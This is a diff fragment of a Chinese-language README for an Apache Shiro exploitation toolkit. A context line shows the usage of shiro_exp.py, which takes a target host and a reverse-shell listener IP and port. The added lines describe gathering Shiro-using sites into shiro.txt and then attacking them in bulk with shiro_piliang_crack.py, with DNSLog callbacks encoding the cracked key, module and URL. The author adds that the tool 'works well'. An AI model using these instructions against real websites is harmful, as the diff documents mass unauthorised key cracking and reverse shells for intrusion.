@@ -82,7 +82,14 @@ python3 shiro_exp.py -u {{攻击的靶机}} -lh {{反弹shell的ip}} -lp {{反�
 ---
 
 ### 4、fuzz-shiro
-根据请求头，响应头做一个简单的测试
+根据请求头，响应头做一个简单的测试-将有shiro的网站丢到shiro.txt中
+### 5、shiro_piliang_crack.py
+建议先从fuzz-shiro中拿到有shiro的站点shiro.txt，然后批量打           
+dnsLog记录为           
+
+{{key}}.{{模块}}.{{url}}.dnsurl
+
+亲测还不错
 
 ## 常见问题
 ### 1、win10下运行时出现 No module named 'Crypto'
